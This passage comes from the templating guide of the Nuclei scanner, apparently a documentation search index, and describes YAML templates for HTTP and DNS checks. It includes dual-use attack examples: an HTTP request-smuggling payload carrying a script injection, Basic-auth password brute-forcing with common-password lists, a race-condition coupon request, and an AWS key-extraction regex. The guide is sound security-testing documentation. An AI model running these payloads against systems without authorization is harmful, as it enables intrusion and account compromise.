on the list of give URLs. workflows : - template : files/git-config.yaml - template : files/svn-config.yaml - template : files/env-file.yaml - template : files/backup-files.yaml # A workflow that runs specific list of checks defined for your project. workflows : - template : cves/ - template : files/ - template : toknes/ - template : mis-configs/ Conditional Workflows \u00b6 You can also create conditional templates which executes after matching the condition from the previous templates, mostly useful for vulnerability detection and exploitation and tech based detection and exploitation, single, multiple along with directory based templates can be executed in chained workflow template. Templates based conditional check For example:- # A workflow that executes subtemplates when base template gets matched. workflows : - template : technologies/jira-detect.yaml subtemplates : - template : exploits/jira-exploit-1.yaml - template : exploits/jira-exploit-1.yaml Templates and matcher name based conditional check For example:- # A workflow that executes subtemplates when a matcher of base template gets matched. workflows : - template : technologies/tech-detect.yaml matchers : - name : vbulletin subtemplates : - template : exploits/vbulletin-exp1.yaml - template : exploits/vbulletin-exp2.yaml - name : jboss subtemplates : - template : exploits/jboss-exp1.yaml - template : exploits/jboss-exp2.yaml In similar manner, one can create as much conditions you want to execute specific templates based on certain conditions. Templates and matcher name based multi level conditional check For example:- # A workflow showcasing chain of template executions that runs only if the previous templates get matched. workflows : - template : technologies/tech-detect.yaml matchers : - name : lotus-domino subtemplates : - template : technologies/lotus-domino-version.yaml subtemplates : - template : cves/xx-yy-zz.yaml subtemplates : - template : cves/xx-xx-xx.yaml Conditional workflows are great examples of performing checks and vulnerability detection in most efficient manner instead of spraying all the templates on your all the targets, and generally comes of with good ROI of your time and good for the target projects and websites as well. Advance Fuzzing \u00b6 We\u2019ve enriched nuclei to allow advanced fuzzing of web servers. Users can now use multiple options to tune HTTP fuzzing workflows. HTTP Pipelining \u00b6 HTTP Pipelining support has been added which allows multiple HTTP requests to be sent on the same connection inspired from http-desync-attacks-request-smuggling-reborn . Before running HTTP pipelining based templates, make sure the running target supports HTTP Pipeline connection, otherwise nuclei engine fallback to stranded HTTP request. If you wanted to confirm the given domain or list of subdomains supports HTTP Pipelining? httpx has a flag -pipeline to probe it. An example configuring pipelining attributes of nuclei template. unsafe : true pipeline : true pipeline-max-connections : 40 pipeline-max-workers : 25000 An example template demonstrating pipelining capabilities of nuclei has been provided below- id : pipeline-testing info : name : pipeline testing author : pdteam severity : info requests : - payloads : path : path_wordlist.txt attack : sniper unsafe : true pipeline : true pipeline-max-connections : 40 pipeline-max-workers : 25000 raw : - | GET /\u00a7path\u00a7 HTTP/1.1 Host: {{Hostname}} User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:79.0) Gecko/20100101 Firefox/79.0 Accept: application/json, text/plain, */* Accept-Language: en-US,en;q=0.5 Referer: {{BaseURL}} Connection: keep-alive matchers : - type : status part : header status : - 200 HTTP Connection pooling \u00b6 While the earlier versions of nuclei did not do connection pooling, users can now configure templates to either use HTTP connection pooling or not. This allows for faster scanning based on requirement. To enable connection pooling in the template, threads attribute can be defined with respective number of threads you wanted to use in the payloads sections. Connection: Close header can not be used in HTTP connection pooling template, otherwise engine will fail and fallback to standard HTTP requests. An example template using HTTP connection pooling- id : fuzzing-example info : name : Connection pooling example author : pdteam severity : info requests : - payloads : password : password.txt threads : 40 attack : sniper raw : - | GET /protected HTTP/1.1 Host: {{Hostname}} Authorization: Basic {{base64('admin:\u00a7password\u00a7')}} User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/55.0 Accept-Language: en-US,en;q=0.9 matchers-condition : and matchers : - type : status status : - 200 - type : word words : - \"Unique string\" part : body HTTP Smuggling \u00b6 HTTP Smuggling is a class of Web-Attacks recently made popular by Portswigger\u2019s Research into the topic. For an in-depth overview, please visit the article linked above. In the open source space, detecting http smuggling is difficult particularly due to the requests for detection being malformed by nature. Nuclei is able to reliably detect HTTP Smuggling vulnerabilities utilising the rawhttp engine. The most basic example of a HTTP Smuggling vulnerability is CL.TE Smuggling. An example template to detect a CE.TL HTTP Smuggling vulnerability is provided below using the unsafe: true attribute for rawhttp based requests. id : CL.TE-http-smuggling info : name : HTTP request smuggling, basic CL.TE vulnerability author : pdteam severity : info lab : https://portswigger.net/web-security/request-smuggling/lab-basic-cl-te requests : - raw : - | POST / HTTP/1.1 Host: {{Hostname}} Connection: keep-alive Content-Type: application/x-www-form-urlencoded Content-Length: 6 Transfer-Encoding: chunked 0 G - | POST / HTTP/1.1 Host: {{Hostname}} Connection: keep-alive Content-Type: application/x-www-form-urlencoded Content-Length: 6 Transfer-Encoding: chunked 0 G unsafe : true matchers : - type : word words : - 'Unrecognized method GPOST' More examples are available in template-examples section for smuggling templates. Race conditions \u00b6 Race Conditions are another class of bugs not easily automated via traditional tooling. Burp Suite introduced a Gate mechanism to Turbo Intruder where all the bytes for all the requests are sent expect the last one at once which is only sent together for all requests synchronizing the send event. We have implemented Gate mechanism in nuclei engine and allow them run via templates which makes the testing for this specfic bug class simple and portable. To enable race condition check within template, race attribute can be set to true and race_count defines the number of simultaneous request you want to initiate. Below is an example template where the same request is repeated for 10 times using the gate logic. id : race-condition-testing info : name : Race condition testing author : pdteam severity : info requests : - raw : - | POST /coupons HTTP/1.1 Host: {{Hostname}} Pragma: no-cache Cache-Control: no-cache, no-transform User-Agent: Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:47.0) Gecko/20100101 Firefox/47.0 promo_code=20OFF race : true race_count : 10 matchers : - type : status part : header status : - 200 You can simply replace the POST request with any suspected vulnerable request and change the race_count as per your need and it's ready to run. nuclei -t race.yaml -target https://api.target.com The best part of this is you can simply share your crafted template with your team mates, triage/security team to replicate the issue on the other side with ease.","title":"Templating Guide"},{"location":"templating-guide/#templating-guide","text":"Nuclei is based on the concepts of YAML based template files that define how the requests will be sent and processed. This allows easy extensibility capabilities to nuclei. The templates are written in YAML which specifies a simple human readable format to quickly define the execution process. Guide to write your own nuclei template - Let's start with the basics and define our own workflow file for detecting the presence of a .git/config file on a webserver and take it from there.","title":"Templating Guide"},{"location":"templating-guide/#template-details","text":"Each template has a unique ID which is used during output writing to specify the template name for an output line. The template file ends with yaml extension. The template files can be created any text editor of your choice. # id contains the unique identifier for the template. id : git-config ID must not contain spaces. This is done to allow easier output parsing.","title":"Template Details"},{"location":"templating-guide/#information","text":"Next important piece of information about a template is the info block. Info block provides more context on the purpose of the template and the author . It also contain severity field which indicates the severity of the template, info block supports dynamic fields, so one can define N number of key: value formatted fields to make template information more relevant for the checks you are writing. Let's add an info block to our template as well. info : # Name is the name of the template name : Git Config File Detection Template # Author is the name of the author for the template author : Ice3man # Severity is the severity for the check. severity : medium # Description optionally describes the template. description : Searches for the pattern /.git/config on passed URLs. # CVSS is impact score of the check. cvss : 4.6 Actual requests and corresponding matchers are placed below the info block and they perform the task of making requests to target servers and finding if the template request was successful. Each template file can contain multiple requests to be made. The template is iterated and one by one the desired HTTP/DNS requests are made to the target sites.","title":"Information"},{"location":"templating-guide/#http-requests","text":"Requests start with a request block which specifies the start of the requests for the template. # Start the requests for the template right here requests :","title":"HTTP Requests"},{"location":"templating-guide/#method","text":"First thing in the request is method . Request method can be GET , POST , PUT , DELETE , etc depending on the needs. # Method is the method for the request method : GET","title":"Method"},{"location":"templating-guide/#redirects","text":"Redirection conditions can be specified per each template. By default, redirects are not followed. However, if desired, they can be enabled with redirects: true in request details. 10 redirects are followed at maximum by default which should be good enough for most use cases. More fine grained control can be exercised over number of redirects followed by using max-redirects field. An example of the usage: requests : - method : GET path : - \"{{BaseURL}}/login.php redirects: true max-redirects: 3","title":"Redirects"},{"location":"templating-guide/#path","text":"The next part of the requests is the path of the request path. Dynamic variables can be placed in the path to modify its behavior on runtime. Variables start with {{ and end with }} and are case-sensitive. BaseURL - Placing BaseURL as a variable in the path will lead to it being replaced on runtime in the request by the original URL as specified in the target file. Hostname - Hostname variable is replaced by the hostname of the target on runtime. Some sample dynamic variable replacement examples: path : \"{{BaseURL}}/.git/config\" # This path will be replaced on execution with BaseURL # If BaseURL is set to https://abc.com then the # path will get replaced to the following: https://abc.com/.git/config Multiple paths can also be specified in one request which will be requested for the target.","title":"Path"},{"location":"templating-guide/#headers","text":"Headers can also be specified to be sent along with the requests. Headers are placed in form of key/value pairs. An example header configuration looks like this: # headers contains the headers for the request headers : # Custom user-agent header User-Agent : Some-Random-User-Agent # Custom request origin Origin : https://google.com","title":"Headers"},{"location":"templating-guide/#body","text":"Body specifies a body to be sent along with the request. For instance: # Body is a string sent along with the request body : \"{\\\"some random JSON\\\"}\" # Body is a string sent along with the request body : \"admin=test\"","title":"Body"},{"location":"templating-guide/#session","text":"To maintain cookie based browser like session between multiple requests, you can simply use cookie-reuse: true in your template, Useful in cases where you want to maintain session between series of request to complete the exploit chain and to perform authenticated scans. # cookie-reuse accepts boolean input and false as default cookie-reuse : true","title":"Session"},{"location":"templating-guide/#matchers","text":"Matchers are the core of nuclei. They are what make the tool so powerful. Multiple type of combinations and checks can be added to ensure that the results you get are free from false-positives.","title":"Matchers"},{"location":"templating-guide/#types","text":"Multiple matchers can be specified in a request. There are basically 6 types of matchers: Matcher Type Part Matched status Status Code of Response size Content Length of Response word Response body or headers regex Response body or headers binary Response body dsl All Response Parts To match status codes for responses, you can use the following syntax. matchers : # Match the status codes - type : status # Some status codes we want to match status : - 200 - 302 To match binary for hexadecimal responses, you can use the following syntax. matchers : - type : binary binary : - \"504B0304\" # zip archive - \"526172211A070100\" # rar RAR archive version 5.0 - \"FD377A585A0000\" # xz tar.xz archive condition : or part : body To match size, similar structure can be followed. If the status code of response from the site matches any single one specified in the matcher, the request is marked as successful. Word and Regex matchers can be further configured depending on the needs of the users. Complex matchers of type dsl allows to build more elaborated expressions with helper functions, this is an example of a complex DSL matcher: matchers : - type : dsl dsl : - \"len(body)<1024 && status_code==200\" # Body length less than 1024 and 200 status code - \"contains(toupper(body), md5(cookie))\" # Check if the MD5 sum of cookies is contained in the uppercase body Every part of a HTTP response can be matched with DSL matcher: Response Part Description Example content_length Content-Length Header content_length >= 1024 status_code Response Status Code status_code==200 all_headers Unique string containing all headers len(all_headers) body Body as string len(body) header_name Lowercase header name with - converted to _ len(user_agent) raw Headers + Response len(raw) This is the list for a DNS response supported by DSL matcher: Response Part Description Example rcode Response status rcode == \"NXDOMAIN question Response question section len(question) extra Response extra section len(extra) answer Response answers section len(answer) ns Response authority section len(ns) raw Full response len(raw)","title":"Types"},{"location":"templating-guide/#conditions","text":"Multiple words and regexes can be specified in a single matcher and can be configured with different conditions like AND and OR . AND - Using AND conditions allows matching of all the words from the list of words for the matcher. Only then will the request be marked as successful when all the words have been matched. OR - Using OR conditions allows matching of a single word from the list of matcher. The request will be marked as successful when even one of the word is matched for the matcher.","title":"Conditions"},{"location":"templating-guide/#matched-parts","text":"Multiple parts of the response can also be matched for the request, default matched part is body if not defined. Part Matched Part body Body of the response header Header of the response all Both body and header of the response Example matchers for response body using the AND condition: matchers : # Match the body word - type : word # Some words we want to match words : - \"[core]\" - \"[config]\" # Both words must be found in the response body condition : and # We want to match request body (default) part : body Similarly, matchers can be written to match anything that you want to find in the response body allowing unlimited creativity and extensibility.","title":"Matched Parts"},{"location":"templating-guide/#negative-matchers","text":"All types of matchers also support negative/opposite conditions, mostly useful when you looking to match with exclusions, it can be used by adding negative: true in the matchers block. Here is an example syntax using negative condition, this will return all the URLs not having PHPSESSID in the response header. matchers : - type : word words : - \"PHPSESSID\" part : header negative : true In same manner, negative condition can be used with single or multiple matchers.","title":"Negative Matchers"},{"location":"templating-guide/#multiple-matchers","text":"Multiple matchers can be used in a single template to fingerprint multiple conditions with a single request. Here is an example of syntax for multiple matchers. matchers : - type : word name : php words : - \"X-Powered-By: PHP\" - \"PHPSESSID\" part : header - type : word name : node words : - \"Server: NodeJS\" - \"X-Powered-By: nodejs\" condition : or part : header - type : word name : python words : - \"Python/2.\" - \"Python/3.\" condition : or part : header","title":"Multiple Matchers"},{"location":"templating-guide/#matchers-condition","text":"While using multiple matchers the default condition is to follow OR operation in between all the matchers, AND operation can be used to make sure return the result if all matchers returns true. matchers-condition : and matchers : - type : word words : - \"X-Powered-By: PHP\" - \"PHPSESSID\" condition : or part : header - type : word words : - \"PHP\" part : body","title":"Matchers Condition"},{"location":"templating-guide/#extractors","text":"Extractors are another important feature of nuclei. Extractors can be used to extract and display in results a match from the response body or headers based on available types.","title":"Extractors"},{"location":"templating-guide/#types_1","text":"Multiple extractors can be specified in a request, as of now we support two type of extractors. Extractor Type Part Matched regex Response body or headers kval Response headers or cookie Example extractor for response body using regex, you can use the following syntax. # A list of extractors for text extraction extractors : # type of the extractor. - type : regex # part of the response to extract (can be headers, all too) part : body # regex to use for extraction. regex : - \"(A3T[A-Z0-9]|AKIA|AGPA|AROA|AIPA|ANPA|ANVA|ASIA)[A-Z0-9]{16}\" To extract key-value formatted data from the header, you can use the following syntax. # A list of extractors for text extraction extractors : # type of the extractor - type : kval part : header kval : # header value to extract from response - content-type To extract key-value formatted data from cookie, you can use the following syntax. # A list of extractors for text extraction extractors : # type of the extractor - type : kval kval : # cookie value to extract from response - PHPSESSID","title":"Types"},{"location":"templating-guide/#matched-parts_1","text":"Multiple parts of the response can also be extracted for the request, default matched part is body if not defined. Part Matched Part body Body of the response header Header of the response all Both body and header of the response Note:- kval extractor only supported for header and cookies.","title":"Matched Parts"},{"location":"templating-guide/#dynamic-extractor","text":"Extractor plays an important role while writing an template for chained request which requires dynamic value to use at run time, for example CSRF tokens, headers or any values requires to complete the chain. Example of defining extractor as dynamic variable:- extractors : - type : regex name : api_key part : body internal : true regex : - \"(?m)[0-9]{3,10}\\\\.[0-9]+\" Here we used extractor name as variable api_key which holds the value and can be reused in any part of the request dynamically, this feature is supported in RAW request format only. Note:- You can use internal: true when you only want to use extractor as dynamic variable, this will avoid printing extracted values in the terminal. Extraction of regex content can also be specific for matchgroups . # A list of extractors for text extraction extractors : # type of extractor - type : regex # Let's reuse the extracted CSRF token name : csrf_token part : body # group defines the matching group being used. # In GO the \"match\" is the full array of all matches and submatches # match[0] is the full match # match[n] is the submatches. Most often we'd want match[1] as depicted below group : 1 regex : - '<input\\sname=\"csrf_token\"\\stype=\"hidden\"\\svalue=\"([[:alnum:]]{16})\"\\s/>' The above extractor with name csrf_token will hold the value extracted (by ([[:alnum:]]{16})) as abcdefgh12345678 . This is compared to not using the group variable. # A list of extractors for text extraction extractors : # type of extractor - type : regex # Let's reuse the extracted CSRF token name : csrf_html_tag part : body # No group here regex : - '<input\\sname=\"csrf_token\"\\stype=\"hidden\"\\svalue=\"([[:alnum:]]{16})\"\\s/>' The above extractor with name csrf_html_tag will hold the full match (by <input name=\"csrf_token\"\\stype=\"hidden\"\\svalue=\"([[:alnum:]]{16})\" /> ) as <input name=\"csrf_token\" type=\"hidden\" value=\"abcdefgh12345678\" /> .","title":"Dynamic extractor"},{"location":"templating-guide/#example-http-template","text":"The final template file for the .git/config file mentioned above is as follows: id : git-config info : name : Git Config File author : Ice3man severity : medium description : Searches for the pattern /.git/config on passed URLs. requests : - method : GET path : - \"{{BaseURL}}/.git/config\" matchers : - type : word words : - \"[core]\"","title":"Example HTTP Template"},{"location":"templating-guide/#http-raw-requests","text":"Another way to create request is using raw requests which comes with more flexibility and support of DSL helper functions, like the following ones (as of now it's suggested to leave the Host header as in the example with the variable {{Hostname}} ), All the Matcher, Extractor capabilities can be used with RAW requests in same the way described above. requests : - raw : - | POST /path2/ HTTP/1.1 Host: {{Hostname}} Content-Length: 1 Origin: https://www.google.com Content-Type: application/x-www-form-urlencoded User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_5) AppleWebKit/537.36 (KHTML, like Gecko) Accept-Language: en-US,en;q=0.9 a=test&b=pd Requests can be fine tuned to perform the exact tasks as desired. Nuclei requests are fully configurable meaning you can configure and define each and every single thing about the requests that will be sent to the target servers. Here follows an example:","title":"HTTP Raw requests"},{"location":"templating-guide/#intruder-payloads","text":"It's possible to define placeholders with simple keywords (or using brackets {{helper_function(keyword)}} in case mutator functions are needed), and perform Sniper , Pitchfork and ClusterBomb attacks. The wordlist for these attacks needs to be defined during the request definition under the Payload field, with a name matching the keyword, Nuclei supports both file based and in template wordlist support and Finally all DSL functionalities are fully available and supported, and can be used to manipulate the final values. Payloads are defined using variable name and can be referenced in the request between \u00a7 marker, for example \u00a7variable_name\u00a7 . An example of the using payloads with local wordlist: requests : # HTTP Intruder fuzzing using local wordlist. - payloads : parameter : params.txt header : local.txt An example of the using payloads with in template wordlist support: requests : # HTTP Intruder fuzzing using in template wordlist. requests : - payloads : password : - admin - guest - password - test - 12345 - 123456 Note:- be careful while selecting attack type, as unexpected input will break the template. For example, if you used clusterbomb or pitchfork as attack type and defined only one variable in the payload section, template will fail to compile, as clusterbomb or pitchfork expect more then one variable to use in the template.","title":"Intruder payloads"},{"location":"templating-guide/#intruder-attack","text":"For using intruder, we support multiple attack types, including sniper which generally used to fuzz single parameter, clusterbomb and pitchfork for fuzzing multiple parameters which works same as classical burp intruder on CLI. An example of the using using clusterbomb attack to fuzz. # Defining HTTP Intruder attack type attack : clusterbomb # Available attack types: sniper, pitchfork and clusterbomb","title":"Intruder attack"},{"location":"templating-guide/#raw-http-support","text":"Nuclei also supports rawhttp for complete request control and customization allowing any kind of malformed requests checks for issues like HTTP request smuggling, Host header injection, CRLF with malformed characters and more, rawhttp library is disabled as default and can be used by including unsafe: true in the request block. Here is an example for HTTP request smuggling detection using rawhttp . requests : - raw : - | POST / HTTP/1.1 Host: {{Hostname}} Content-Type: application/x-www-form-urlencoded Content-Length: 150 Transfer-Encoding: chunked 0 GET /post?postId=5 HTTP/1.1 User-Agent: a\"/><script>alert(1)</script> Content-Type: application/x-www-form-urlencoded Content-Length: 5 x=1 - | GET /post?postId=5 HTTP/1.1 Host: {{Hostname}} unsafe : true # enables rawhttp client matchers : - type : dsl dsl : - 'contains(body, \"<script>alert(1)</script>\")' Using rawhttp also enable automatic handling of host header and content-length header, to disable this behavior, disable-automatic-content-length-header and disable-automatic-host-header can be used in following manner. requests: - raw: - | POST / HTTP/1.1 Host: {{Hostname}} Content-Type: application/x-www-form-urlencoded Content-Length: 150 Transfer-Encoding: chunked 0 unsafe: true # enables rawhttp client disable-automatic-content-length-header: true disable-automatic-host-header: true matchers: - type: dsl dsl: - 'contains(body, \"<script>alert(1)</script>\")'","title":"RAW HTTP Support"},{"location":"templating-guide/#helper-functions","text":"Here is the list of all supported helper functions can be used in the RAW requests: Helper function Description Example len Length of a string len(\"Hello\") toupper String to uppercase toupper(\"Hello\") tolower String to lowercase tolower(\"Hello\") replace Replace string parts replace(\"Hello\", \"He\", \"Ha\") trim Remove trailing unicode chars trim(\"aaaHelloddd\", \"ad\") trimleft Remove unicode chars from left trimleft(\"aaaHelloddd\", \"ad\") trimright Remove unicode chars from right trimleft(\"aaaHelloddd\", \"ad\") trimspace Remove trailing spaces trimspace(\" Hello \") trimprefix Trim specified prefix trimprefix(\"aaHelloaa\", \"aa\") trimsuffix Trim specified suffix trimsuffix(\"aaHelloaa\", \"aa\") base64 Encode string to base64 base64(\"Hello\") base64_decode Decode string from base64 base64_decode(\"SGVsbG8=\") url_encode URL encode a string url_encode(\"hxxps://projectdiscovery.io/test?a=1\") url_decode URL decode a string url_decode(\"https:%2F%2Fprojectdiscovery.io%3Ftest=1\") hex_encode Hex encode a string hex_encode(\"aa\") hex_decode Hex decode a string hex_decode(\"6161\") html_escape Hex encode a string html_escape(\" test \") html_unescape Hex decode a string html_unescape(\"<body>test</body>\") md5 Calculate md5 of string md5(\"Hello\") sha256 Calculate sha256 of string sha256(\"Hello\") sha1 Calculate sha1 of string sha1(\"Hello\") contains Verify if a string contains another one contains(\"Hello\", \"lo\") regex Verify a regex versus a string regex(\"H([a-z]+)o\", \"Hello\") An example of the using helper function in the header. raw : # Request with simple header manipulation with DSL functions - | GET /manager/html HTTP/1.1 Host: {{Hostname}} Authorization: Basic {{base64('username:password')}} User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/55.0 Accept-Language: en-US,en;q=0.9 Connection: close","title":"Helper functions"},{"location":"templating-guide/#example-raw-template","text":"id : http-raw-request info : name : Example-Fuzzing requests : - payloads : username : - admin password : - admin - guest - password - test - 12345 - 123456 attack : clusterbomb # Supported attack types: sniper, pitchfork and clusterbomb raw : # Request with simple header manipulation with DSL functions - | GET /manager/html HTTP/1.1 Host: {{Hostname}} Authorization: Basic {{base64('username:password')}} User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/55.0 Accept-Language: en-US,en;q=0.9 Connection: close matchers : - type : status status : - 200","title":"Example RAW Template"},{"location":"templating-guide/#dns-requests","text":"Requests start with a dns block which specifies the start of the requests for the template. # Start the requests for the template right here dns : DNS requests can be fine tuned to perform the exact tasks as desired. Nuclei requests are fully configurable meaning you can configure and define each and every single thing about the requests that will be sent to the target servers.","title":"DNS Requests"},{"location":"templating-guide/#type","text":"First thing in the request is type . Request type can be A , NS , CNAME , SOA , PTR , MX , TXT , AAAA . # type is the type for the dns request type : A","title":"Type"},{"location":"templating-guide/#name","text":"The next part of the requests is the name of the request path. Dynamic variables can be placed in the path to modify its value on runtime. Variables start with {{ and end with }} and are case-sensitive. FQDN - variable is replaced by the hostname/FQDN of the target on runtime. Some sample dynamic variable replacement examples: name : {{ FQDN }} .com # This value will be replaced on execution with the FQDN. # If FQDN is https://this.is.an.example then the # name will get replaced to the following: this.is.an.example.com As of now the tool supports only one question per request.","title":"Name"},{"location":"templating-guide/#class","text":"Class type can be INET , CSNET , CHAOS , HESIOD , NONE and ANY . Usually it's enough to just leave it as INET . # method is the class for the dns request class : inet","title":"Class"},{"location":"templating-guide/#recursion","text":"Recursion is a boolean value, and determines if the resolver should only return cached results, or traverse the whole dns root tree to retrieve fresh results. Generally it's better to leave it as true . # Recursion is a boolean determining if the request is recursive recursion : true","title":"Recursion"},{"location":"templating-guide/#retries","text":"Retries is the number of attempts a dns query is retried before giving up among different resolvers. It's recommended a reasonable value, like 3 . # Retries is a number of retries before giving up on dns resolution retries : 3","title":"Retries"},{"location":"templating-guide/#matchers_1","text":"Matchers are just equal to HTTP, but the search is performed on the whole dns response, therefore it's not necessary to specify the part . Multiple type of combinations and checks can be added to ensure that the results you get are free from false positives. The complex dsl matcher type allows to build complex queries as described in the HTTP section.","title":"Matchers"},{"location":"templating-guide/#types_2","text":"Multiple matchers can be specified in a request. There are basically 3 types of matchers: Matcher Type Part Matched word DNS Response regex DNS Response dsl DNS Response","title":"Types"},{"location":"templating-guide/#example-dns-template","text":"The final example template file for performing A query, and check if CNAME and A records are in the response is as follows: id : dummy-cname-a info : name : Dummy A dns request author : mzack9999 severity : none description : Checks if CNAME and A record is returned. dns : - name : \"{{FQDN}}\" type : A class : inet recursion : true retries : 3 matchers : - type : word words : # The response must contains a CNAME record - \"IN\\tCNAME\" # and also at least 1 A record - \"IN\\tA\" condition : and","title":"Example DNS Template"},{"location":"templating-guide/#workflows","text":"Workflows are powerful utility of nuclei and most efficient way to use nuclei templates where all the templates can be configured based on specific needs of users, one can configure a workflow in a way that ensures / control complete nuclei templates checks from a single workflow, the use cases varies depending upon the users needs. Tengo , a scripting engine is used as a base for nuclei workflows which provides a very powerful and highly customizable engine for users to automate all their needs. Workflows can be defined with workflows attribute, following the template or subtemplates to executes, and we can write two type of workflows. # Workflows starts form this block. workflows : - template : technologies/template-to-execute.yaml Type of workflows Generic workflows Conditional workflows","title":"Workflows"},{"location":"templating-guide/#generic-workflows","text":"In generic workflow one can define a single or multiple template executions from a single workflow, it can be list of specific templates or list of directory containing multiple templates. For example:- # A workflow that runs all config related templates on the list of give URLs. workflows : - template : files/git-config.yaml - template : files/svn-config.yaml - template : files/env-file.yaml - template : files/backup-files.yaml # A workflow that runs specific list of checks defined for your project. workflows : - template : cves/ - template : files/ - template : toknes/ - template : mis-configs/","title":"Generic Workflows"},{"location":"templating-guide/#conditional-workflows","text":"You can also create conditional templates which executes after matching the condition from the previous templates, mostly useful for vulnerability detection and exploitation and tech based detection and exploitation, single, multiple along with directory based templates can be executed in chained workflow template. Templates based conditional check For example:- # A workflow that executes subtemplates when base template gets matched. workflows : - template : technologies/jira-detect.yaml subtemplates : - template : exploits/jira-exploit-1.yaml - template : exploits/jira-exploit-1.yaml Templates and matcher name based conditional check For example:- # A workflow that executes subtemplates when a matcher of base template gets matched. workflows : - template : technologies/tech-detect.yaml matchers : - name : vbulletin subtemplates : - template : exploits/vbulletin-exp1.yaml - template : exploits/vbulletin-exp2.yaml - name : jboss subtemplates : - template : exploits/jboss-exp1.yaml - template : exploits/jboss-exp2.yaml In similar manner, one can create as much conditions you want to execute specific templates based on certain conditions. Templates and matcher name based multi level conditional check For example:- # A workflow showcasing chain of template executions that runs only if the previous templates get matched. workflows : - template : technologies/tech-detect.yaml matchers : - name : lotus-domino subtemplates : - template : technologies/lotus-domino-version.yaml subtemplates : - template : cves/xx-yy-zz.yaml subtemplates : - template : cves/xx-xx-xx.yaml Conditional workflows are great examples of performing checks and vulnerability detection in most efficient manner instead of spraying all the templates on your all the targets, and generally comes of with good ROI of your time and good for the target projects and websites as well.","title":"Conditional Workflows"},{"location":"templating-guide/#advance-fuzzing","text":"We\u2019ve enriched nuclei to allow advanced fuzzing of web servers. Users can now use multiple options to tune HTTP fuzzing workflows.","title":"Advance Fuzzing"},{"location":"templating-guide/#http-pipelining","text":"HTTP Pipelining support has been added which allows multiple HTTP requests to be sent on the same connection inspired from http-desync-attacks-request-smuggling-reborn . Before running HTTP pipelining based templates, make sure the running target supports HTTP Pipeline connection, otherwise nuclei engine fallback to stranded HTTP request. If you wanted to confirm the given domain or list of subdomains supports HTTP Pipelining? httpx has a flag -pipeline to probe it. An example configuring pipelining attributes of nuclei template. unsafe : true pipeline : true pipeline-max-connections : 40 pipeline-max-workers : 25000 An example template demonstrating pipelining capabilities of nuclei has been provided below- id : pipeline-testing info : name : pipeline testing author : pdteam severity : info requests : - payloads : path : path_wordlist.txt attack : sniper unsafe : true pipeline : true pipeline-max-connections : 40 pipeline-max-workers : 25000 raw : - | GET /\u00a7path\u00a7 HTTP/1.1 Host: {{Hostname}} User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:79.0) Gecko/20100101 Firefox/79.0 Accept: application/json, text/plain, */* Accept-Language: en-US,en;q=0.5 Referer: {{BaseURL}} Connection: keep-alive matchers : - type : status part : header status : - 200","title":"HTTP Pipelining"},{"location":"templating-guide/#http-connection-pooling","text":"While the earlier versions of nuclei did not do connection pooling, users can now configure templates to either use HTTP connection pooling or not. This allows for faster scanning based on requirement. To enable connection pooling in the template, threads attribute can be defined with respective number of threads you wanted to use in the payloads sections. Connection: Close header can not be used in HTTP connection pooling template, otherwise engine will fail and fallback to standard HTTP requests. An example template using HTTP connection pooling- id : fuzzing-example info : name : Connection pooling example author : pdteam severity : info requests : - payloads : password : password.txt threads : 40 attack : sniper raw : - | GET /protected HTTP/1.1 Host: {{Hostname}} Authorization: Basic {{base64('admin:\u00a7password\u00a7')}} User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/55.0 Accept-Language: en-US,en;q=0.9 matchers-condition : and matchers : - type : status status : - 200 - type : word words : - \"Unique string\" part : body","title":"HTTP Connection pooling"},{"location":"templating-guide/#http-smuggling","text":"HTTP Smuggling is a class of Web-Attacks recently made popular by Portswigger\u2019s Research into the topic. For an in-depth overview, please visit the article linked above. In the open source space, detecting http smuggling is difficult particularly due to the requests for detection being malformed by nature. Nuclei is able to reliably detect HTTP Smuggling vulnerabilities utilising the rawhttp engine. The most basic example of a HTTP Smuggling vulnerability is CL.TE Smuggling. An example template to detect a CE.TL HTTP Smuggling vulnerability is provided below using the unsafe: true attribute for rawhttp based requests. id : CL.TE-http-smuggling info : name : HTTP request smuggling, basic CL.TE vulnerability author : pdteam severity : info lab : https://portswigger.net/web-security/request-smuggling/lab-basic-cl-te requests : - raw : - | POST / HTTP/1.1 Host: {{Hostname}} Connection: keep-alive Content-Type: application/x-www-form-urlencoded Content-Length: 6 Transfer-Encoding: chunked 0 G - | POST / HTTP/1.1 Host: {{Hostname}} Connection: keep-alive Content-Type: application/x-www-form-urlencoded Content-Length: 6 Transfer-Encoding: chunked 0 G unsafe : true matchers : - type : word words : - 'Unrecognized method GPOST' More examples are available in template-examples section for smuggling templates.","title":"HTTP Smuggling"},{"location":"templating-guide/#race-conditions","text":"Race Conditions are another class of bugs not easily automated via traditional tooling. Burp Suite introduced a Gate mechanism to Turbo Intruder where all the bytes for all the requests are sent expect the last one at once which is only sent together for all requests synchronizing the send event. We have implemented Gate mechanism in nuclei engine and allow them run via templates which makes the testing for this specfic bug class simple and portable. To enable race condition check within template, race attribute can be set to true and race_count defines the number of simultaneous request you want to initiate. Below is an example template where the same request is repeated for 10 times using the gate logic. id : race-condition-testing info : name : Race condition testing author : pdteam severity : info requests : - raw : - | POST /coupons HTTP/1.1 Host: {{Hostname}} Pragma: no-cache Cache-Control: no-cache, no-transform User-Agent: Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:47.0) Gecko/20100101 Firefox/47.0 promo_code=20OFF race : true race_count : 10 matchers : - type : status part : header status : - 200 You can simply replace the POST request with any suspected vulnerable request and change the race_count as per your need and it's ready to run. nuclei -t race.yaml -target https://api.target.com The best part of this is you can simply share your crafted template with your team mates, triage/security team to replicate the issue on the other side with ease.","title":"Race conditions"}]}